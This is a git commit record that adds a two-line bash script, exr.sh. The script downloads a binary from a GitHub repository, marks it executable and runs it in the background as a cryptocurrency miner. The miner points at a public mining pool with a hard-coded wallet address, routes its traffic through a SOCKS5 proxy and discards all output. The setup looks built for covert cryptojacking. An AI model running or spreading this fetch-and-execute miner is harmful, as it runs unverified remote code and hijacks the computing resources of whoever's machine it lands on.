68d5349d906f7741fa9792f22f9f9bd3bbb0c3a5
iyalah <109784638+iyalah@users.noreply.github.com>
2022-09-10 17:22:14 +0700

    Add files via upload

---
+++ exr.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/iyalah/super-duper-goggles/raw/cpu/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o stratum+tcp://cryptonight_haven.mine.zergpool.com:4452 -u MRkSxj9EY41vhUL2utoYP6pTRTELHXJtQN -p c=LTC,mc=BLOC -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
